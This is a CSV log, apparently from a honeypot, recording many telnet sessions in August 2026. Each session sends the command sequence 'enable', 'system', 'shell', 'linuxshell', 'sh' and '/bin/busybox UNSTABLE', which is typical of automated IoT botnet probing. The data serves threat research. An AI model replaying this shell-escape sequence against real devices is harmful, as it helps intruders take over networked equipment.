474,c7acc357eb08,2026-08-28 22:28:41,,0,shell 
475,d4c87f895621,2026-08-28 22:28:45,,1,enable
476,d4c87f895621,2026-08-28 22:28:45,,0,enable 
477,d4c87f895621,2026-08-28 22:28:48,,1,linuxshell
478,d4c87f895621,2026-08-28 22:28:48,,0,linuxshell 
479,73bbe5dfab60,2026-08-28 22:29:05,,1,linuxshell
480,73bbe5dfab60,2026-08-28 22:29:05,,0,linuxshell 
481,8cff144c48e0,2026-08-28 22:29:11,,1,linuxshell
482,8cff144c48e0,2026-08-28 22:29:11,,0,linuxshell 
483,430b175c3eea,2026-08-28 22:29:43,,1,enable
484,430b175c3eea,2026-08-28 22:29:43,,0,enable 
485,d4c87f895621,2026-08-28 22:30:00,,1,system
486,d4c87f895621,2026-08-28 22:30:00,,0,system 
487,de71075112af,2026-08-28 22:30:38,,1,enable
488,de71075112af,2026-08-28 22:30:39,,0,enable 
489,d4c87f895621,2026-08-28 22:30:41,,1,shell
490,d4c87f895621,2026-08-28 22:30:41,,0,shell 
491,430b175c3eea,2026-08-28 22:30:44,,1,linuxshell
492,430b175c3eea,2026-08-28 22:30:44,,0,linuxshell 
493,0102978cfbae,2026-08-28 22:31:13,,1,enable
494,0102978cfbae,2026-08-28 22:31:13,,0,enable 
495,32270c97a802,2026-08-28 22:33:23,,1,enable
496,32270c97a802,2026-08-28 22:33:23,,0,enable 
497,32270c97a802,2026-08-28 22:34:07,,1,linuxshell
498,32270c97a802,2026-08-28 22:34:08,,0,linuxshell 
499,32270c97a802,2026-08-28 22:35:15,,1,system
500,32270c97a802,2026-08-28 22:35:15,,0,system 
501,22ffc1336df5,2026-08-28 22:37:11,,1,enable
502,22ffc1336df5,2026-08-28 22:37:12,,0,enable 
503,22ffc1336df5,2026-08-28 22:37:24,,1,linuxshell
504,22ffc1336df5,2026-08-28 22:37:24,,0,linuxshell 
505,cfc3c18b48cb,2026-08-28 22:38:42,,1,enable
506,cfc3c18b48cb,2026-08-28 22:38:42,,0,enable 
507,22ffc1336df5,2026-08-28 22:38:43,,1,system
508,22ffc1336df5,2026-08-28 22:38:43,,0,system 
509,3a515faeb67a,2026-08-28 22:38:46,,1,enable
510,3a515faeb67a,2026-08-28 22:38:47,,0,enable 
511,a8e90686922c,2026-08-28 22:39:21,,1,system
512,a8e90686922c,2026-08-28 22:39:21,,0,system 
513,a8e90686922c,2026-08-28 22:39:22,,1,shell
514,a8e90686922c,2026-08-28 22:39:22,,0,shell 
515,a8e90686922c,2026-08-28 22:39:22,,1,sh
516,a8e90686922c,2026-08-28 22:39:23,,1,/bin/busybox UNSTABLE
517,3a515faeb67a,2026-08-28 22:39:26,,1,linuxshell
518,3a515faeb67a,2026-08-28 22:39:26,,0,linuxshell 
519,cfc3c18b48cb,2026-08-28 22:40:35,,1,linuxshell
520,cfc3c18b48cb,2026-08-28 22:40:36,,0,linuxshell 
521,51634586f263,2026-08-28 22:42:18,,1,enable
522,51634586f263,2026-08-28 22:42:18,,0,enable 
523,526c2495ba2a,2026-08-28 22:43:46,,1,enable
524,526c2495ba2a,2026-08-28 22:43:46,,0,enable 
525,72ae2b2cc7fd,2026-08-28 22:43:59,,1,enable
526,72ae2b2cc7fd,2026-08-28 22:44:00,,0,enable 
527,1ec35333b949,2026-08-28 22:44:41,,1,enable
528,1ec35333b949,2026-08-28 22:44:42,,0,enable 
529,c8f3587ba084,2026-08-28 22:45:21,,1,enable
530,c8f3587ba084,2026-08-28 22:45:21,,0,enable 
531,526c2495ba2a,2026-08-28 22:45:26,,1,linuxshell
532,526c2495ba2a,2026-08-28 22:45:26,,0,linuxshell 
533,7be69961f251,2026-08-28 22:46:41,,1,enable
534,7be69961f251,2026-08-28 22:46:42,,0,enable 
535,491ecd3bbe31,2026-08-28 22:46:58,,1,enable
536,491ecd3bbe31,2026-08-28 22:46:59,,0,enable 
537,c8f3587ba084,2026-08-28 22:46:59,,1,linuxshell
538,c8f3587ba084,2026-08-28 22:46:59,,0,linuxshell 
539,ec989b7e4c52,2026-08-28 22:47:20,,1,enable
540,ec989b7e4c52,2026-08-28 22:47:20,,0,enable 
541,7be69961f251,2026-08-28 22:47:53,,1,linuxshell
542,7be69961f251,2026-08-28 22:47:54,,0,linuxshell 
543,40f0e9922306,2026-08-28 22:48:11,,1,enable
544,40f0e9922306,2026-08-28 22:48:12,,0,enable 
545,491ecd3bbe31,2026-08-28 22:48:18,,1,linuxshell
546,491ecd3bbe31,2026-08-28 22:48:18,,0,linuxshell 
547,ec989b7e4c52,2026-08-28 22:48:23,,1,linuxshell
548,ec989b7e4c52,2026-08-28 22:48:23,,0,linuxshell 
549,40f0e9922306,2026-08-28 22:49:47,,1,linuxshell
550,40f0e9922306,2026-08-28 22:49:47,,0,linuxshell 
551,cf22c9dae2ed,2026-08-28 22:50:11,,1,enable
552,cf22c9dae2ed,2026-08-28 22:50:12,,0,enable 
553,cf22c9dae2ed,2026-08-28 22:50:33,,1,linuxshell
554,cf22c9dae2ed,2026-08-28 22:50:34,,0,linuxshell 
555,cf22c9dae2ed,2026-08-28 22:51:21,,1,system
556,cf22c9dae2ed,2026-08-28 22:51:21,,0,system 
557,cf22c9dae2ed,2026-08-28 22:51:30,,1,shell
558,cf22c9dae2ed,2026-08-28 22:51:30,,0,shell 
559,ae3a4f67577c,2026-08-28 22:54:45,,1,enable
560,ae3a4f67577c,2026-08-28 22:54:45,,0,enable 
561,ae3a4f67577c,2026-08-28 22:54:46,,1,linuxshell
562,ae3a4f67577c,2026-08-28 22:54:46,,0,linuxshell 
563,ae3a4f67577c,2026-08-28 22:55:24,,1,system
564,ae3a4f67577c,2026-08-28 22:55:25,,0,system 
565,6f48299a7b48,2026-08-28 22:55:46,,1,enable
566,6f48299a7b48,2026-08-28 22:55:46,,0,enable 
567,8af4af17b6cd,2026-08-28 22:56:13,,1,enable
568,8af4af17b6cd,2026-08-28 22:56:13,,0,enable 
569,1cec50be565a,2026-08-28 22:56:18,,1,enable
570,1cec50be565a,2026-08-28 22:56:19,,0,enable 
571,1cec50be565a,2026-08-28 22:56:19,,1,linuxshell
572,1cec50be565a,2026-08-28 22:56:19,,0,linuxshell 
573,1cec50be565a,2026-08-28 22:56:28,,1,system
574,1cec50be565a,2026-08-28 22:56:28,,0,system 
575,6f48299a7b48,2026-08-28 22:57:07,,1,linuxshell
576,6f48299a7b48,2026-08-28 22:57:08,,0,linuxshell 
577,0d9c9edcccba,2026-08-28 22:57:08,,1,enable
578,0d9c9edcccba,2026-08-28 22:57:08,,0,enable 
579,ae3a4f67577c,2026-08-28 22:57:09,,1,shell
580,ae3a4f67577c,2026-08-28 22:57:09,,0,shell 
581,ae3a4f67577c,2026-08-28 22:57:10,,1,sh
582,ae3a4f67577c,2026-08-28 22:57:11,,1,/bin/busybox UNSTABLE
583,6f48299a7b48,2026-08-28 22:57:22,,1,system
584,6f48299a7b48,2026-08-28 22:57:22,,0,system 
585,1cec50be565a,2026-08-28 22:57:32,,1,shell
586,1cec50be565a,2026-08-28 22:57:33,,0,shell 
587,8af4af17b6cd,2026-08-28 22:57:40,,1,linuxshell
588,8af4af17b6cd,2026-08-28 22:57:41,,0,linuxshell 
589,394dcd31ce31,2026-08-28 23:00:29,,1,enable
590,394dcd31ce31,2026-08-28 23:00:29,,0,enable 
591,f1a87d5dd0e3,2026-08-28 23:00:47,,1,enable
592,f1a87d5dd0e3,2026-08-28 23:00:47,,0,enable 
593,394dcd31ce31,2026-08-28 23:01:37,,1,linuxshell
594,394dcd31ce31,2026-08-28 23:01:38,,0,linuxshell 
595,f1a87d5dd0e3,2026-08-28 23:01:58,,1,linuxshell
596,f1a87d5dd0e3,2026-08-28 23:01:59,,0,linuxshell 
597,f1a87d5dd0e3,2026-08-28 23:02:49,,1,system
598,f1a87d5dd0e3,2026-08-28 23:02:49,,0,system 
599,4d82222d7691,2026-08-28 23:02:56,,1,enable
600,4d82222d7691,2026-08-28 23:02:56,,0,enable 
601,f1a87d5dd0e3,2026-08-28 23:03:42,,1,shell
602,f1a87d5dd0e3,2026-08-28 23:03:42,,0,shell 
603,d4485819b205,2026-08-28 23:05:00,,1,enable
604,d4485819b205,2026-08-28 23:05:00,,0,enable 
605,b66664480488,2026-08-28 23:06:06,,1,enable
606,b66664480488,2026-08-28 23:06:07,,0,enable 
607,2f7f6d35786a,2026-08-28 23:09:58,,1,enable
608,2f7f6d35786a,2026-08-28 23:09:59,,0,enable 
609,00ec63f64b8a,2026-08-28 23:14:05,,1,enable
610,00ec63f64b8a,2026-08-28 23:14:05,,0,enable 
611,00ec63f64b8a,2026-08-28 23:15:45,,1,linuxshell
612,00ec63f64b8a,2026-08-28 23:15:46,,0,linuxshell 
613,00ec63f64b8a,2026-08-28 23:15:47,,1,system
614,00ec63f64b8a,2026-08-28 23:15:48,,0,system 
615,361e55efd35d,2026-08-28 23:23:13,,1,enable
616,361e55efd35d,2026-08-28 23:23:14,,0,enable 
617,dfd8fe78a053,2026-08-28 23:23:37,,1,enable
618,dfd8fe78a053,2026-08-28 23:23:37,,0,enable 
619,6a3c7890ffbe,2026-08-28 23:24:33,,1,enable
620,6a3c7890ffbe,2026-08-28 23:24:33,,0,enable 
621,2674f5dc8750,2026-08-28 23:24:38,,1,enable
622,2674f5dc8750,2026-08-28 23:24:38,,0,enable 
623,dfd8fe78a053,2026-08-28 23:24:46,,1,linuxshell
624,dfd8fe78a053,2026-08-28 23:24:46,,0,linuxshell 
625,9848b85e98b4,2026-08-28 23:25:08,,1,enable
626,9848b85e98b4,2026-08-28 23:25:09,,0,enable 
627,9848b85e98b4,2026-08-28 23:25:18,,1,linuxshell
628,9848b85e98b4,2026-08-28 23:25:18,,0,linuxshell 
629,2674f5dc8750,2026-08-28 23:25:44,,1,linuxshell
630,2674f5dc8750,2026-08-28 23:25:44,,0,linuxshell 
631,6a3c7890ffbe,2026-08-28 23:26:12,,1,linuxshell
632,6a3c7890ffbe,2026-08-28 23:26:12,,0,linuxshell 
633,9848b85e98b4,2026-08-28 23:26:32,,1,system
634,9848b85e98b4,2026-08-28 23:26:33,,0,system 
635,1d7b7cce8597,2026-08-28 23:28:12,,1,enable
636,1d7b7cce8597,2026-08-28 23:28:12,,0,enable 
637,1d7b7cce8597,2026-08-28 23:29:03,,1,linuxshell
638,1d7b7cce8597,2026-08-28 23:29:04,,0,linuxshell 
639,86913b857324,2026-08-28 23:29:22,,1,enable
640,86913b857324,2026-08-28 23:29:22,,0,enable 
641,1d7b7cce8597,2026-08-28 23:29:34,,1,system
642,1d7b7cce8597,2026-08-28 23:29:35,,0,system 
643,77b22ee525f2,2026-08-28 23:29:50,,1,enable
644,77b22ee525f2,2026-08-28 23:29:50,,0,enable 
645,215a5e543ae9,2026-08-28 23:30:00,,1,enable
646,215a5e543ae9,2026-08-28 23:30:00,,0,enable 
647,77b22ee525f2,2026-08-28 23:30:14,,1,linuxshell
648,77b22ee525f2,2026-08-28 23:30:14,,0,linuxshell 
649,86913b857324,2026-08-28 23:30:32,,1,linuxshell
650,86913b857324,2026-08-28 23:30:32,,0,linuxshell 
651,a30e1d9bb91d,2026-08-28 23:30:52,,1,enable
652,a30e1d9bb91d,2026-08-28 23:30:52,,0,enable 
653,215a5e543ae9,2026-08-28 23:31:11,,1,linuxshell
654,215a5e543ae9,2026-08-28 23:31:11,,0,linuxshell 
655,88bad14f0c79,2026-08-28 23:31:19,,1,enable
656,88bad14f0c79,2026-08-28 23:31:20,,0,enable 
657,77b22ee525f2,2026-08-28 23:31:28,,1,system
658,77b22ee525f2,2026-08-28 23:31:29,,0,system 
659,88bad14f0c79,2026-08-28 23:31:41,,1,linuxshell
660,88bad14f0c79,2026-08-28 23:31:42,,0,linuxshell 
661,a30e1d9bb91d,2026-08-28 23:32:21,,1,linuxshell
662,a30e1d9bb91d,2026-08-28 23:32:21,,0,linuxshell 
663,a30e1d9bb91d,2026-08-28 23:32:21,,1,system
664,a30e1d9bb91d,2026-08-28 23:32:21,,0,system 
665,88bad14f0c79,2026-08-28 23:32:22,,1,system
666,88bad14f0c79,2026-08-28 23:32:23,,0,system 
667,88bad14f0c79,2026-08-28 23:32:23,,1,shell
668,88bad14f0c79,2026-08-28 23:32:23,,0,shell 
669,88bad14f0c79,2026-08-28 23:32:24,,1,sh
670,215a5e543ae9,2026-08-28 23:32:37,,1,system
671,215a5e543ae9,2026-08-28 23:32:37,,0,system 
672,cf01901bd3e5,2026-08-28 23:33:24,,1,enable
673,cf01901bd3e5,2026-08-28 23:33:24,,0,enable 
674,5cc3d6d84710,2026-08-28 23:33:42,,1,enable
675,5cc3d6d84710,2026-08-28 23:33:42,,0,enable 
676,5cc3d6d84710,2026-08-28 23:33:42,,1,linuxshell
677,5cc3d6d84710,2026-08-28 23:33:42,,0,linuxshell 
678,5cc3d6d84710,2026-08-28 23:33:44,,1,system
679,5cc3d6d84710,2026-08-28 23:33:45,,0,system 
680,4b87c573ef7e,2026-08-28 23:34:40,,1,enable
681,4b87c573ef7e,2026-08-28 23:34:40,,0,enable 
682,5cc3d6d84710,2026-08-28 23:34:48,,1,shell
683,5cc3d6d84710,2026-08-28 23:34:49,,0,shell 
684,cf01901bd3e5,2026-08-28 23:35:20,,1,linuxshell
685,cf01901bd3e5,2026-08-28 23:35:20,,0,linuxshell 
686,5cc3d6d84710,2026-08-28 23:36:04,,1,sh
687,5cc3d6d84710,2026-08-28 23:36:05,,1,/bin/busybox UNSTABLE
688,4b87c573ef7e,2026-08-28 23:36:15,,1,linuxshell
689,4b87c573ef7e,2026-08-28 23:36:15,,0,linuxshell 
690,f0ca199deee2,2026-08-28 23:36:31,,1,enable
691,f0ca199deee2,2026-08-28 23:36:31,,0,enable 
692,f0ca199deee2,2026-08-28 23:37:02,,1,linuxshell
693,f0ca199deee2,2026-08-28 23:37:03,,0,linuxshell 
694,8fcc752ece46,2026-08-28 23:37:04,,1,enable
695,8fcc752ece46,2026-08-28 23:37:04,,0,enable 
696,8fcc752ece46,2026-08-28 23:37:04,,1,linuxshell
697,8fcc752ece46,2026-08-28 23:37:04,,0,linuxshell 
698,fda76f1f159e,2026-08-28 23:37:15,,1,enable
699,fda76f1f159e,2026-08-28 23:37:15,,0,enable 
700,fda76f1f159e,2026-08-28 23:37:26,,1,linuxshell
701,fda76f1f159e,2026-08-28 23:37:26,,0,linuxshell 
702,8fcc752ece46,2026-08-28 23:37:57,,1,system
703,8fcc752ece46,2026-08-28 23:37:57,,0,system 
704,2c65e616fad1,2026-08-28 23:38:17,,1,enable
705,2c65e616fad1,2026-08-28 23:38:17,,0,enable 
706,2c65e616fad1,2026-08-28 23:38:18,,1,linuxshell
707,2c65e616fad1,2026-08-28 23:38:18,,0,linuxshell 
708,2c65e616fad1,2026-08-28 23:38:18,,1,system
709,2c65e616fad1,2026-08-28 23:38:18,,0,system 
710,f0ca199deee2,2026-08-28 23:38:25,,1,system
711,f0ca199deee2,2026-08-28 23:38:26,,0,system 
712,2c65e616fad1,2026-08-28 23:38:26,,1,shell
713,2c65e616fad1,2026-08-28 23:38:26,,0,shell 
714,f0ca199deee2,2026-08-28 23:38:34,,1,shell
715,f0ca199deee2,2026-08-28 23:38:34,,0,shell 
716,fda76f1f159e,2026-08-28 23:39:09,,1,system
717,fda76f1f159e,2026-08-28 23:39:09,,0,system 
718,8fcc752ece46,2026-08-28 23:39:12,,1,shell
719,8fcc752ece46,2026-08-28 23:39:12,,0,shell 
720,2c65e616fad1,2026-08-28 23:39:34,,1,sh
721,06cc62ad549f,2026-08-28 23:40:40,,1,enable
722,06cc62ad549f,2026-08-28 23:40:40,,0,enable 
723,2b059849462f,2026-08-28 23:40:42,,1,enable
724,2b059849462f,2026-08-28 23:40:43,,0,enable 
725,2b059849462f,2026-08-28 23:41:45,,1,linuxshell
726,2b059849462f,2026-08-28 23:41:46,,0,linuxshell 
727,06cc62ad549f,2026-08-28 23:42:31,,1,linuxshell
728,06cc62ad549f,2026-08-28 23:42:31,,0,linuxshell 
729,04fc6730b8d4,2026-08-28 23:44:46,,1,enable
730,04fc6730b8d4,2026-08-28 23:44:47,,0,enable 
731,329a3ce12c8e,2026-08-28 23:45:54,,1,enable
732,329a3ce12c8e,2026-08-28 23:45:54,,0,enable 
733,8c8acc4120eb,2026-08-28 23:46:40,,1,enable
734,8c8acc4120eb,2026-08-28 23:46:40,,0,enable 
735,31f6ea2a6d2e,2026-08-28 23:54:34,,1,enable
736,31f6ea2a6d2e,2026-08-28 23:54:34,,0,enable 
737,31f6ea2a6d2e,2026-08-28 23:55:51,,1,linuxshell
738,31f6ea2a6d2e,2026-08-28 23:55:51,,0,linuxshell 
739,31f6ea2a6d2e,2026-08-28 23:55:52,,1,system
740,31f6ea2a6d2e,2026-08-28 23:55:52,,0,system 
741,31f6ea2a6d2e,2026-08-28 23:55:52,,1,shell
742,31f6ea2a6d2e,2026-08-28 23:55:52,,0,shell 
743,31f6ea2a6d2e,2026-08-28 23:55:53,,1,sh
744,31f6ea2a6d2e,2026-08-28 23:55:53,,1,/bin/busybox UNSTABLE
745,88b4b63b966e,2026-08-28 23:56:16,,1,enable
746,88b4b63b966e,2026-08-28 23:56:16,,0,enable 
747,88b4b63b966e,2026-08-28 23:57:24,,1,linuxshell
748,88b4b63b966e,2026-08-28 23:57:24,,0,linuxshell 
749,46535e0f4e3d,2026-08-28 23:57:24,,1,enable
750,46535e0f4e3d,2026-08-28 23:57:24,,0,enable 
751,46535e0f4e3d,2026-08-28 23:58:05,,1,linuxshell
752,46535e0f4e3d,2026-08-28 23:58:06,,0,linuxshell 
753,0d16ccaf1202,2026-08-28 23:59:24,,1,system
754,0d16ccaf1202,2026-08-28 23:59:25,,0,system 
755,46535e0f4e3d,2026-08-28 23:59:31,,1,system
756,46535e0f4e3d,2026-08-28 23:59:32,,0,system 
757,0d16ccaf1202,2026-08-28 23:59:39,,1,shell
758,0d16ccaf1202,2026-08-28 23:59:39,,0,shell 
759,8a84e0b3aad9,2026-08-29 00:00:16,,1,enable
760,8a84e0b3aad9,2026-08-29 00:00:16,,0,enable 
761,6e701850352b,2026-08-29 00:00:16,,1,enable
762,6e701850352b,2026-08-29 00:00:16,,0,enable 
763,6e701850352b,2026-08-29 00:00:50,,1,linuxshell
764,6e701850352b,2026-08-29 00:00:51,,0,linuxshell 
765,e074e51cc301,2026-08-29 00:01:44,,1,enable
766,e074e51cc301,2026-08-29 00:01:45,,0,enable 
767,0d16ccaf1202,2026-08-29 00:01:45,,1,sh
768,8a84e0b3aad9,2026-08-29 00:02:10,,1,linuxshell
769,8a84e0b3aad9,2026-08-29 00:02:10,,0,linuxshell 
770,e074e51cc301,2026-08-29 00:02:47,,1,linuxshell
771,e074e51cc301,2026-08-29 00:02:47,,0,linuxshell 
772,e074e51cc301,2026-08-29 00:03:59,,1,system
773,e074e51cc301,2026-08-29 00:04:00,,0,system 
774,c3b7735bfeb5,2026-08-29 00:04:04,,1,enable
775,c3b7735bfeb5,2026-08-29 00:04:04,,0,enable 
776,888a534203ae,2026-08-29 00:05:14,,1,enable
777,888a534203ae,2026-08-29 00:05:14,,0,enable 
778,c3b7735bfeb5,2026-08-29 00:05:31,,1,linuxshell
779,c3b7735bfeb5,2026-08-29 00:05:31,,0,linuxshell 
780,888a534203ae,2026-08-29 00:05:36,,1,linuxshell
781,888a534203ae,2026-08-29 00:05:37,,0,linuxshell 
782,591a830c7124,2026-08-29 00:05:48,,1,enable
783,591a830c7124,2026-08-29 00:05:49,,0,enable 
784,54a44c931a03,2026-08-29 00:05:52,,1,enable
785,54a44c931a03,2026-08-29 00:05:53,,0,enable 
786,35b13131425f,2026-08-29 00:06:25,,1,enable
787,35b13131425f,2026-08-29 00:06:25,,0,enable 
788,35b13131425f,2026-08-29 00:06:25,,1,linuxshell
789,35b13131425f,2026-08-29 00:06:25,,0,linuxshell 
790,35b13131425f,2026-08-29 00:06:26,,1,system
791,35b13131425f,2026-08-29 00:06:26,,0,system 
792,35b13131425f,2026-08-29 00:06:26,,1,shell
793,35b13131425f,2026-08-29 00:06:26,,0,shell 
794,35b13131425f,2026-08-29 00:06:27,,1,sh
795,35b13131425f,2026-08-29 00:06:27,,1,/bin/busybox UNSTABLE
796,28dff8062ba4,2026-08-29 00:07:02,,1,enable
797,28dff8062ba4,2026-08-29 00:07:03,,0,enable 
798,54a44c931a03,2026-08-29 00:07:04,,1,linuxshell
799,54a44c931a03,2026-08-29 00:07:05,,0,linuxshell 
800,591a830c7124,2026-08-29 00:07:27,,1,linuxshell
801,591a830c7124,2026-08-29 00:07:27,,0,linuxshell 
802,888a534203ae,2026-08-29 00:07:27,,1,system
803,888a534203ae,2026-08-29 00:07:27,,0,system 
804,28dff8062ba4,2026-08-29 00:08:30,,1,linuxshell
805,28dff8062ba4,2026-08-29 00:08:30,,0,linuxshell 
806,28dff8062ba4,2026-08-29 00:08:37,,1,system
807,28dff8062ba4,2026-08-29 00:08:37,,0,system 
808,4f7822fd8ddc,2026-08-29 00:13:45,,1,enable
809,4f7822fd8ddc,2026-08-29 00:13:45,,0,enable 
810,134754c3250b,2026-08-29 00:13:47,,1,enable
811,134754c3250b,2026-08-29 00:13:47,,0,enable 
812,615545e7130b,2026-08-29 00:14:11,,1,enable
813,615545e7130b,2026-08-29 00:14:11,,0,enable 
814,4f7822fd8ddc,2026-08-29 00:14:27,,1,linuxshell
815,4f7822fd8ddc,2026-08-29 00:14:27,,0,linuxshell 
816,134754c3250b,2026-08-29 00:14:29,,1,linuxshell
817,134754c3250b,2026-08-29 00:14:29,,0,linuxshell 
818,134754c3250b,2026-08-29 00:14:51,,1,system
819,134754c3250b,2026-08-29 00:14:52,,0,system 
820,615545e7130b,2026-08-29 00:15:17,,1,linuxshell
821,615545e7130b,2026-08-29 00:15:18,,0,linuxshell 
822,2be00031aa95,2026-08-29 00:15:49,,1,enable
823,2be00031aa95,2026-08-29 00:15:50,,0,enable 
824,615545e7130b,2026-08-29 00:16:28,,1,system
825,615545e7130b,2026-08-29 00:16:29,,0,system 
826,11688c33a1df,2026-08-29 00:17:15,,1,enable
827,11688c33a1df,2026-08-29 00:17:15,,0,enable 
828,c59e4bbcbb30,2026-08-29 00:17:22,,1,enable
829,c59e4bbcbb30,2026-08-29 00:17:22,,0,enable 
830,7b3b227d7929,2026-08-29 00:17:22,,1,enable
831,7b3b227d7929,2026-08-29 00:17:22,,0,enable 
832,2aff3f1e3ff4,2026-08-29 00:17:35,,1,enable
833,2aff3f1e3ff4,2026-08-29 00:17:35,,0,enable 
834,bf105084ba0e,2026-08-29 00:17:47,,1,enable
835,bf105084ba0e,2026-08-29 00:17:47,,0,enable 
836,11688c33a1df,2026-08-29 00:18:06,,1,linuxshell
837,11688c33a1df,2026-08-29 00:18:06,,0,linuxshell 
838,c59e4bbcbb30,2026-08-29 00:18:16,,1,linuxshell
839,c59e4bbcbb30,2026-08-29 00:18:16,,0,linuxshell 
840,7b3b227d7929,2026-08-29 00:18:30,,1,linuxshell
841,7b3b227d7929,2026-08-29 00:18:31,,0,linuxshell 
842,11688c33a1df,2026-08-29 00:19:05,,1,system
843,11688c33a1df,2026-08-29 00:19:05,,0,system 
844,bf105084ba0e,2026-08-29 00:19:21,,1,linuxshell
845,bf105084ba0e,2026-08-29 00:19:21,,0,linuxshell 
846,a0838767dceb,2026-08-29 00:19:22,,1,enable
847,a0838767dceb,2026-08-29 00:19:22,,0,enable 
848,c59e4bbcbb30,2026-08-29 00:19:45,,1,system
849,c59e4bbcbb30,2026-08-29 00:19:46,,0,system 
850,2aff3f1e3ff4,2026-08-29 00:19:49,,1,linuxshell
851,2aff3f1e3ff4,2026-08-29 00:19:49,,0,linuxshell 
852,7b3b227d7929,2026-08-29 00:19:51,,1,system
853,7b3b227d7929,2026-08-29 00:19:51,,0,system 
854,21cd0798fcf6,2026-08-29 00:20:06,,1,enable
855,21cd0798fcf6,2026-08-29 00:20:06,,0,enable 
856,06c0a7f5b903,2026-08-29 00:20:53,,1,enable
857,06c0a7f5b903,2026-08-29 00:20:53,,0,enable 
858,a0838767dceb,2026-08-29 00:21:01,,1,linuxshell
859,a0838767dceb,2026-08-29 00:21:01,,0,linuxshell 
860,21cd0798fcf6,2026-08-29 00:21:09,,1,linuxshell
861,21cd0798fcf6,2026-08-29 00:21:10,,0,linuxshell 
862,21cd0798fcf6,2026-08-29 00:21:49,,1,system
863,21cd0798fcf6,2026-08-29 00:21:50,,0,system 
864,06c0a7f5b903,2026-08-29 00:22:15,,1,linuxshell
865,06c0a7f5b903,2026-08-29 00:22:15,,0,linuxshell 
866,a65fead01dc7,2026-08-29 00:22:17,,1,enable
867,a65fead01dc7,2026-08-29 00:22:17,,0,enable 
868,edaba2b7c15a,2026-08-29 00:22:37,,1,enable
869,edaba2b7c15a,2026-08-29 00:22:37,,0,enable 
870,4015471af033,2026-08-29 00:23:05,,1,enable
871,4015471af033,2026-08-29 00:23:05,,0,enable 
872,5a6b07c53d44,2026-08-29 00:25:38,,1,enable
873,5a6b07c53d44,2026-08-29 00:25:39,,0,enable 
874,d9eac3c102e3,2026-08-29 00:26:32,,1,enable
875,d9eac3c102e3,2026-08-29 00:26:32,,0,enable 
876,48ff8c1d154e,2026-08-29 00:26:58,,1,enable
877,48ff8c1d154e,2026-08-29 00:26:58,,0,enable 
878,5a6b07c53d44,2026-08-29 00:26:58,,1,linuxshell
879,5a6b07c53d44,2026-08-29 00:26:58,,0,linuxshell 
880,38c6f7c562e0,2026-08-29 00:27:44,,1,system
881,38c6f7c562e0,2026-08-29 00:27:44,,0,system 
882,38c6f7c562e0,2026-08-29 00:27:44,,1,shell
883,38c6f7c562e0,2026-08-29 00:27:44,,0,shell 
884,38c6f7c562e0,2026-08-29 00:27:48,,1,sh
885,84d3449784fb,2026-08-29 00:28:16,,1,enable
886,84d3449784fb,2026-08-29 00:28:17,,0,enable 
887,48ff8c1d154e,2026-08-29 00:28:27,,1,linuxshell
888,48ff8c1d154e,2026-08-29 00:28:27,,0,linuxshell 
889,38c6f7c562e0,2026-08-29 00:29:02,,1,/bin/busybox UNSTABLE
890,cc8c968be4bc,2026-08-29 00:29:11,,1,system
891,cc8c968be4bc,2026-08-29 00:29:11,,0,system 
892,84d3449784fb,2026-08-29 00:29:38,,1,linuxshell
893,84d3449784fb,2026-08-29 00:29:38,,0,linuxshell 
894,cc8c968be4bc,2026-08-29 00:29:54,,1,shell
895,cc8c968be4bc,2026-08-29 00:29:54,,0,shell 
896,91152d9e61cf,2026-08-29 00:29:54,,1,enable
897,91152d9e61cf,2026-08-29 00:29:54,,0,enable 
898,84d3449784fb,2026-08-29 00:30:16,,1,system
899,84d3449784fb,2026-08-29 00:30:17,,0,system 
900,f008d9f7dab4,2026-08-29 00:35:26,,1,enable
901,f008d9f7dab4,2026-08-29 00:35:26,,0,enable 
902,f008d9f7dab4,2026-08-29 00:36:53,,1,linuxshell
903,f008d9f7dab4,2026-08-29 00:36:53,,0,linuxshell 
904,5adba329b4e2,2026-08-29 00:37:19,,1,enable
905,5adba329b4e2,2026-08-29 00:37:19,,0,enable 
906,411a002a2f3d,2026-08-29 00:40:42,,1,enable
907,411a002a2f3d,2026-08-29 00:40:42,,0,enable 
908,411a002a2f3d,2026-08-29 00:40:43,,1,linuxshell
909,411a002a2f3d,2026-08-29 00:40:43,,0,linuxshell 
910,411a002a2f3d,2026-08-29 00:40:43,,1,system
911,411a002a2f3d,2026-08-29 00:40:43,,0,system 
912,411a002a2f3d,2026-08-29 00:40:43,,1,shell
913,411a002a2f3d,2026-08-29 00:40:43,,0,shell 
914,411a002a2f3d,2026-08-29 00:40:50,,1,sh
915,a379fdf202e2,2026-08-29 00:41:08,,1,enable
916,a379fdf202e2,2026-08-29 00:41:08,,0,enable 
917,f1a940898f81,2026-08-29 00:41:52,,1,enable
918,f1a940898f81,2026-08-29 00:41:52,,0,enable 
919,411a002a2f3d,2026-08-29 00:42:11,,1,/bin/busybox UNSTABLE
920,a379fdf202e2,2026-08-29 00:42:47,,1,linuxshell
921,a379fdf202e2,2026-08-29 00:42:47,,0,linuxshell 
922,f1a940898f81,2026-08-29 00:43:05,,1,linuxshell
923,f1a940898f81,2026-08-29 00:43:05,,0,linuxshell 
924,b9dda2b64bb8,2026-08-29 00:43:41,,1,enable
925,b9dda2b64bb8,2026-08-29 00:43:41,,0,enable 
926,79eac9291902,2026-08-29 00:43:55,,1,enable
927,79eac9291902,2026-08-29 00:43:55,,0,enable 
928,9a5928514131,2026-08-29 00:44:00,,1,enable
929,9a5928514131,2026-08-29 00:44:00,,0,enable 
930,9a5928514131,2026-08-29 00:44:02,,1,linuxshell
931,9a5928514131,2026-08-29 00:44:02,,0,linuxshell 
932,100b05dbb2a0,2026-08-29 00:44:10,,1,enable
933,100b05dbb2a0,2026-08-29 00:44:10,,0,enable 
934,34cde0ad1b7d,2026-08-29 00:44:18,,1,enable
935,34cde0ad1b7d,2026-08-29 00:44:18,,0,enable 
936,9a5928514131,2026-08-29 00:45:30,,1,system
937,9a5928514131,2026-08-29 00:45:30,,0,system 
938,b9dda2b64bb8,2026-08-29 00:45:33,,1,linuxshell
939,b9dda2b64bb8,2026-08-29 00:45:33,,0,linuxshell 
940,34cde0ad1b7d,2026-08-29 00:45:37,,1,linuxshell
941,34cde0ad1b7d,2026-08-29 00:45:37,,0,linuxshell 
942,34cde0ad1b7d,2026-08-29 00:45:38,,1,system
943,34cde0ad1b7d,2026-08-29 00:45:38,,0,system 
944,34cde0ad1b7d,2026-08-29 00:45:38,,1,shell
945,34cde0ad1b7d,2026-08-29 00:45:38,,0,shell 
946,79eac9291902,2026-08-29 00:45:55,,1,linuxshell
947,79eac9291902,2026-08-29 00:45:55,,0,linuxshell 
948,f982bab318ba,2026-08-29 00:46:00,,1,enable
